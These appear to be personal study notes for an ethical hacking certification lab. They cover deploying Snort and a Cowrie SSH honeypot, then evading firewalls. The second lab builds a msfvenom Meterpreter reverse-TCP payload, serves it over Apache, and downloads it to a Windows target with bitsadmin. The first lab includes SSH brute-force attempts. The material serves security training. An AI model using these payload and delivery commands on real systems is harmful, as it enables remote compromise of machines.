<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CEH Lab - Mod12 - Evading IDS, Firewalls, Honeypots</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 10px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.collection-content td {
	white-space: pre-wrap;
	word-break: break-word;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.callout img.notion-static-icon {
	width: 1em;
	height: 1em;
}

.callout p {
	margin: 0;
}

.callout h1,
.callout h2,
.callout h3 {
	margin: 0 0 0.6rem;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

blockquote.quote-large {
	font-size: 1.25em;
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray {
	color: rgba(134, 131, 126, 1);
	fill: rgba(134, 131, 126, 1);
}
.highlight-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.highlight-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.highlight-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.highlight-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.highlight-blue {
	color: rgba(63, 126, 190, 1);
	fill: rgba(63, 126, 190, 1);
}
.highlight-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.highlight-default_background {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray_background {
	background: rgba(42, 28, 0, 0.07);
}
.highlight-brown_background {
	background: rgba(139, 46, 0, 0.086);
}
.highlight-orange_background {
	background: rgba(224, 101, 1, 0.129);
}
.highlight-yellow_background {
	background: rgba(211, 168, 0, 0.137);
}
.highlight-teal_background {
	background: rgba(0, 100, 45, 0.09);
}
.highlight-blue_background {
	background: rgba(0, 111, 200, 0.09);
}
.highlight-purple_background {
	background: rgba(102, 0, 178, 0.078);
}
.highlight-pink_background {
	background: rgba(197, 0, 93, 0.086);
}
.highlight-red_background {
	background: rgba(223, 22, 0, 0.094);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(134, 131, 126, 1);
	fill: rgba(134, 131, 126, 1);
}
.block-color-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.block-color-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.block-color-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.block-color-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.block-color-blue {
	color: rgba(63, 126, 190, 1);
	fill: rgba(63, 126, 190, 1);
}
.block-color-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(240, 239, 237, 1);
}
.block-color-brown_background {
	background: rgba(245, 237, 233, 1);
}
.block-color-orange_background {
	background: rgba(251, 235, 222, 1);
}
.block-color-yellow_background {
	background: rgba(249, 243, 220, 1);
}
.block-color-teal_background {
	background: rgba(232, 241, 236, 1);
}
.block-color-blue_background {
	background: rgba(232, 242, 250, 1);
}
.block-color-purple_background {
	background: rgba(243, 235, 249, 1);
}
.block-color-pink_background {
	background: rgba(250, 233, 241, 1);
}
.block-color-red_background {
	background: rgba(252, 233, 231, 1);
}
.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="25d3addf-00cb-80bd-ae99-f048a47ca22d" class="page sans"><header><h1 class="page-title">CEH Lab - Mod12 - Evading IDS, Firewalls, Honeypots</h1><p class="page-description"></p></header><div class="page-body"><p id="25d3addf-00cb-80d1-bfb5-e19a61dde1b7" class="">
</p><p id="25d3addf-00cb-8007-92ee-d6b8cf4b9224" class="">Lab Objective The objective of the lab is to evade the IDS and Firewall, and other tasks that include, but are not limited to: </p><p id="25d3addf-00cb-8056-8d4b-c3310c793ef7" class="">▪ Detect intrusion attempts </p><p id="25d3addf-00cb-80b3-9dc2-e1a9711640b2" class="">▪ Detect malicious network traffic </p><p id="25d3addf-00cb-80d2-a356-d7e0d71951de" class="">▪ Detect intruders and their attack weapon </p><p id="25d3addf-00cb-809f-a7e0-e523b0c5e14c" class="">▪ Evade firewalls using various evasion techniques </p><p id="25d3addf-00cb-8017-b76c-e44a9609b393" class="">
</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 1: Perform Intrusion Detection using Various Tools</summary><div class="indented"><p id="25d3addf-00cb-80b4-b920-fba44ce3d589" class="">
</p><p id="25d3addf-00cb-8038-a7e0-f96507ee36d2" class="">Lab Objectives </p><p id="25d3addf-00cb-8081-b67f-d3636dc71cdc" class="">▪ Detect intrusions using Snort </p><p id="25d3addf-00cb-80cb-b5f0-e318a11db0e5" class="">▪ Deploy Cowrie honeypot to detect malicious network traffic<br/></p><h3 id="25d3addf-00cb-80bc-a16b-ec348f57d763" class="">Task 1: Detect Intrusions using Snort</h3><p id="25e3addf-00cb-80b0-9240-e97499988df0" class="">
</p><p id="25d3addf-00cb-80d2-9adb-de5b3c0f4bcb" class=""><strong>Snort </strong>is an open-source network intrusion detection system, capable of performing real-time traffic analysis and packet logging on IP networks. </p><p id="25d3addf-00cb-80fb-8438-c054f0a37356" class="">▪ Straight packet sniffer such as tcpdump ▪ Packet logger (useful for network traffic debugging, etc.) ▪ Network intrusion prevention system<br/></p><h3 id="25d3addf-00cb-80e0-8a9e-c3d15becf2c3" class="">Task 2: Deploy Cowrie Honeypot to Detect Malicious Network Traffic</h3><p id="25e3addf-00cb-8026-adaf-c1865754e13f" class="">
</p><p id="25e3addf-00cb-8039-8161-f474135665cf" class=""><strong>Cowrie </strong>serves as an SSH and Telnet honeypot, capable of capturing brute-force attacks and the actions taken by attackers within the shell</p><p id="25e3addf-00cb-809e-9bb2-fd6bcee9f812" class="">
</p><p id="25d3addf-00cb-80ff-9941-f610d0645655" class="">Cowrie: </p><ol type="1" id="25e3addf-00cb-80a1-b8f4-c56085542ab6" class="numbered-list" start="1"><li><strong>pip install --upgrade -r requirements.txt</strong> to install all the required dependencies</li></ol><ol type="1" id="25e3addf-00cb-80fc-b249-cf006af4084c" class="numbered-list" start="2"><li>cd</li></ol><ol type="1" id="25e3addf-00cb-8028-a122-f1abdc6bee81" class="numbered-list" start="3"><li>cd to path cowrie folder is located in → <strong>chmod -R 777 cowrie </strong></li></ol><ol type="1" id="25e3addf-00cb-80aa-a637-f8be218a76be" class="numbered-list" start="4"><li>Run <strong>iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222</strong> to redirect the traffic coming on port 22 to port 2222. This redirection channels incoming traffic to a Cowrie honeypot, ensuring the protection of the primary system by segregating potential risks. </li></ol><ol type="1" id="25e3addf-00cb-8046-92db-e0a80ea4b55b" class="numbered-list" start="5"><li>Enablle the Cowrie honeypot to operate on port 22 without requiring root privileges:<ol type="a" id="25e3addf-00cb-80ca-8475-c418749a2314" class="numbered-list" start="1"><li>Run touch /etc/authbind/byport/22 to create an authbind configuration file for port 22, essential for granting permission to the Cowrie honeypot to listen on that specific port.</li></ol><ol type="a" id="25e3addf-00cb-80f2-90b8-fad374cb41ee" class="numbered-list" start="2"><li>Run chown cowrie:cowrie /etc/authbind/byport/22 to change the ownership of the authbind configuration file for port 22 to the user and group &quot;cowrie,&quot; ensuring proper access permissions for the Cowrie honeypot to operate on that port</li></ol><ol type="a" id="25e3addf-00cb-808d-a297-cdd4fc9f1792" class="numbered-list" start="3"><li>Run chmod 770 /etc/authbind/byport/22 to set appropriate permissions on the authbind configuration file for port 22, ensuring that the Cowrie honeypot has the necessary access to operate on the port without requiring root privileges</li></ol></li></ol><ol type="1" id="25e3addf-00cb-806b-bc82-f7b24056b003" class="numbered-list" start="6"><li>Run virtualenv --python=python3 cowrie-env to create a virtual environment. Run source cowrie-env/bin/activate to activate the environment</li></ol><ol type="1" id="25e3addf-00cb-8059-8430-ed7f1c5106e7" class="numbered-list" start="7"><li>Exit the root privileged terminal using exit command. Navigate to cowrie directory using cd cowrie command. Here, run bin/cowrie start to initiate the Cowrie honeypot and begin monitoring and logging incoming traffic for security analysis and threat detection purposes.</li></ol><ol type="1" id="25e3addf-00cb-8049-ad48-f5667022967d" class="numbered-list" start="8"><li>In the terminal, acquire root privileges using sudo su command and execute cd var/log/cowrie/ to navigate to var/log/cowrie. Now, run tail cowrie.log to view the log file.<br/>Note: Here, Ready to accept SSH connections confirms that the honeypot is successfully setup.</li></ol><p id="25e3addf-00cb-80e2-8f25-f14b542e4038" class="">
</p><p id="25e3addf-00cb-8067-92af-d11b672b245e" class="">Probe with parrot security machine: </p><ol type="1" id="25e3addf-00cb-8055-949f-e933d340c45e" class="numbered-list" start="1"><li>nmap -p--sV 10.10.1.9 command </li></ol><ol type="1" id="25e3addf-00cb-80ac-be68-e025f5fc9226" class="numbered-list" start="2"><li>You can observe that the port 22 is open and is the default port used for SSH connection. Since the port is open, we will try to connect to the machine using SSH<br/>Note: Here, you can also observe the SSH service running on port 2222 that is a honeypot that we have deployed. Attackers will target the SSH service running on default SSH port (22).<br/>CEH </li></ol><ol type="1" id="25e3addf-00cb-80cd-811b-dc593d66a445" class="numbered-list" start="3"><li> To establish a connection to the target machine via SSH, we will use PuTTY. Initiate the PuTTY interface by executing putty command</li></ol><ol type="1" id="25e3addf-00cb-801a-bcab-fe6c89e8593a" class="numbered-list" start="4"><li>Enter the IP address of the target machine (here, 10.10.1.9) in the Host Name (or IP address) field, and proceed by clicking on Open button</li></ol><ol type="1" id="25e3addf-00cb-80a8-8f55-c378bba71947" class="numbered-list" start="5"><li>In 10.10.1.9 - PuTTY (as superuser) window, type ubuntu in login as field and password as toor, it responds with Access denied. Try a random set of passwords to bruteforce into the target machine</li></ol><p id="25e3addf-00cb-80d2-8c71-d7f36511be84" class="">
</p><p id="25e3addf-00cb-80f6-8389-c4ebd8a949c8" class="">Observing attempts in cowrie: </p><ol type="1" id="25e3addf-00cb-806a-a5c3-fbd7ae0705b1" class="numbered-list" start="1"><li>Run<strong> tail cowrie.log.</strong> Here, observe the logs generated when the attacker tried to connect to the SSH service on the Ubuntu machine using PuTTY. These log entries serve as evidence of the attacker&#x27;s unauthorized access attempts.</li></ol></div></details><p id="25e3addf-00cb-8083-898f-cb0eef6265d7" class="">
</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 2: Evade IDS/Firewalls using Various Evasion Techniques</summary><div class="indented"><p id="25e3addf-00cb-8097-8b7e-d860c3cf7f53" class="">
</p><h3 id="25e3addf-00cb-806b-aadc-dba1ee43e489" class="">Lab Objectives</h3><p id="25e3addf-00cb-806a-8ab4-f49462b4930f" class="">Evade firewall through Windows BITSAdmin<br/></p><p id="25e3addf-00cb-8099-a1fd-d73acf91a0a1" class="">Firewall evasion techniques: </p><p id="25e3addf-00cb-80c9-946c-e7763430f27d" class="">▪ Port Scanning ▪ Firewalking ▪ Banner Grabbing ▪ IP Address Spoofing ▪ Source Routing ▪ Tiny Fragments ▪ Using an IP Address in Place of URL ▪ Using Anonymous Website Surfing Sites ▪ Using a Proxy Server ▪ ICMP Tunneling ▪ ACK Tunneling ▪ HTTP Tunneling ▪ SSH Tunneling ▪ DNS Tunneling ▪ Through External Systems ▪ Through MITM Attack ▪ Through Content ▪ Through XSS Attack</p><p id="25e3addf-00cb-80b1-8e19-f3ddb83e3532" class="">
</p><p id="25e3addf-00cb-809c-804b-c4141c837c8d" class="">
</p><h3 id="25e3addf-00cb-8008-adc2-d7f547b74eb0" class="">Task 1: Evade Firewall through Windows BITSAdmin </h3><p id="25e3addf-00cb-805a-a5af-e7bcf62638b4" class=""><strong>BITS (Background Intelligent Transfer Service)</strong> is an essential component of Windows XP and later versions of Windows operating systems</p><ul id="25e3addf-00cb-80dc-bac9-c8a21b244ab5" class="bulleted-list"><li style="list-style-type:disc">Used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares. </li></ul><ul id="25e3addf-00cb-80c9-829c-c9d327350559" class="bulleted-list"><li style="list-style-type:disc">Used to create download or upload jobs and monitor their progress. </li></ul><p id="25e3addf-00cb-80d5-848a-e2e5f444fdbd" class="">
</p><p id="25e3addf-00cb-8058-906a-f449d14ee0ff" class="">Use BITSAdmin to evade firewall and transfer malicious file into the target machine: </p><ol type="1" id="25e3addf-00cb-8013-8bd3-dbea42f1bd88" class="numbered-list" start="1"><li>Parrot security</li></ol><ol type="1" id="25e3addf-00cb-8012-8c14-d218b0b638a8" class="numbered-list" start="2"><li>Create payload: <ol type="a" id="25e3addf-00cb-80bc-b95b-e308b02d98ba" class="numbered-list" start="1"><li>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Exploit.exe </li></ol></li></ol><ol type="1" id="25e3addf-00cb-8054-b35c-d07c23126485" class="numbered-list" start="3"><li>Create dir to share payload with target machine, provide permissions, copy file to shared location <ol type="a" id="25e3addf-00cb-8038-8fd8-c80362ca45a5" class="numbered-list" start="1"><li>mkdir /var/www/html/share</li></ol><ol type="a" id="25e3addf-00cb-8011-bc7e-d24d4d94f56e" class="numbered-list" start="2"><li>chmod -R 755 /var/www/html/share</li></ol><ol type="a" id="25e3addf-00cb-8028-9915-ce6f36a5ac3f" class="numbered-list" start="3"><li>chown chmod -R 755 /var/www/html/share </li></ol><ol type="a" id="25e3addf-00cb-8022-8ec8-e6983133d5e2" class="numbered-list" start="4"><li>chown -R www-data:www-data /var/www/html/share </li></ol></li></ol><ol type="1" id="2643addf-00cb-801b-95cd-d7000f82deb9" class="numbered-list" start="4"><li>Start Apache service<ol type="a" id="2643addf-00cb-8000-bc9f-c95046f24c95" class="numbered-list" start="1"><li>service apache2 start</li></ol></li></ol><ol type="1" id="2643addf-00cb-8007-b2d3-e5f725039c29" class="numbered-list" start="5"><li>On target machine<ol type="a" id="2643addf-00cb-808c-946e-e839e1de2b3c" class="numbered-list" start="1"><li>bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe</li></ol></li></ol></div></details><p id="25e3addf-00cb-8066-b64e-ca290fe64fe6" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>